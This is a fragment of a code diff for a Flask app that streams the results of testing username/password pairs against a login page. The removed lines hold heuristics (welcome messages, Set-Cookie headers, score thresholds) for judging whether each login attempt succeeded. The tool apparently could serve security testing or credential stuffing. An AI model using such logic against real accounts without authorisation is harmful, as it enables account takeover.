-                        elif found_generic_welcome and not found_specific_welcome: # Generic welcome, but not specific (and B2 didn't catch it more strongly)
-                            if not any("welcome to our service" in pi.lower() for pi in positive_indicators): # Avoid double counting if already part of a keyword
-                                login_score += 5
-                                positive_indicators.append("Generic welcome message found")
-
-
-                        # D8: Check for Session-Related Headers (Set-Cookie in the final response)
-                        # This is somewhat covered by C2 (cookies_changed), but specifically looks at the final response headers.
-                        if 'Set-Cookie' in response.headers:
-                            # Check if this specific indicator for Set-Cookie is already covered by "cookies_changed" to avoid double points for same underlying reason
-                            already_counted_cookie_change = any("cookies were set or changed" in pi for pi in positive_indicators)
-                            if not already_counted_cookie_change:
-                                login_score += 15
-                                positive_indicators.append("Set-Cookie header found in the final response, indicating session activity")
-
-                        # Ensure positive and negative indicators are unique to avoid clutter if same condition met multiple ways
-                        positive_indicators = list(set(positive_indicators))
-                        negative_indicators = list(set(negative_indicators))
-
-                        # Determine Final Status and Details
-                        final_status = "unknown"
-                        if login_score >= 50:
-                            final_status = "success"
-                        elif login_score <= -50:
-                            final_status = "failure"
-                        # else: final_status remains "unknown" or could be "likely_success/failure" based on score bands
-
-                        details_string = f"Final Score: {login_score}. Positive Indicators: {positive_indicators}. Negative Indicators: {negative_indicators}."
-                        if final_status == "unknown":
-                            if login_score > 0:
-                                details_string += " (Ambiguous, leaning positive)"
-                            elif login_score < 0:
-                                details_string += " (Ambiguous, leaning negative)"
-                            else:
-                                details_string += " (Ambiguous, neutral score)"
-
-
-                        attempt_result["status"] = final_status
-                        attempt_result["details"] = details_string
-                        attempt_result["analysis"] = {
-                            "score": login_score,
-                            "positive_indicators": positive_indicators,
-                            "negative_indicators": negative_indicators
-                        }
-
-                        # Log the detailed analysis for debugging on the server
-                        app.logger.debug(f"SSE stream: User '{username_attempt}', Pass '********', Final Score: {login_score}, Status: {final_status}")
-                        app.logger.debug(f"Positive Indicators: {positive_indicators}")
-                        app.logger.debug(f"Negative Indicators: {negative_indicators}")
-
-                        yield f"data: {json.dumps(attempt_result)}\n\n"
-
-                    except requests.exceptions.Timeout:
-                        attempt_result["status"] = "error"
-                        attempt_result["details"] = "Request timed out during login attempt."
-                        app.logger.warning(f"SSE stream: Timeout for user {username_attempt} (pass: ****)", exc_info=False)
-                        yield f"data: {json.dumps(attempt_result)}\n\n"
-                    except requests.exceptions.RequestException as e:
-                        attempt_result["status"] = "error"
-                        attempt_result["details"] = f"Request error: {str(e)}"
-                        app.logger.error(f"SSE stream: RequestException for user {username_attempt} (pass: ****): {str(e)}", exc_info=True)
-                        yield f"data: {json.dumps(attempt_result)}\n\n"
-                    except Exception as e:
-                        attempt_result["status"] = "error"
-                        attempt_result["details"] = "An unexpected error occurred during this attempt."
-                        app.logger.error(f"SSE stream: Unexpected error for user {username_attempt} (pass: ****)", exc_info=True)
-                        yield f"data: {json.dumps(attempt_result)}\n\n"
-
-                completion_event = {'status': 'complete', 'message': 'All credential tests finished.'}
-                app.logger.info("SSE stream: All pairs processed, sending completion event.")
-                yield f"data: {json.dumps(completion_event)}\n\n"
+            completion_event = {'status': 'complete', 'message': 'All credential tests finished.'}
+            yield f"data: {json.dumps(completion_event)}\n\n"
 
         return Response(event_stream(), mimetype='text/event-stream')
 
     except Exception as e:
-        app.logger.error(f"Error in /test_credentials before streaming: {str(e)}", exc_info=True)
+        app.logger.error(f"Error in /test_credentials_stream before streaming: {str(e)}", exc_info=True)
         return jsonify({"error": f"An unexpected server error occurred before streaming could start."}), 500
 
 if __name__ == '__main__':
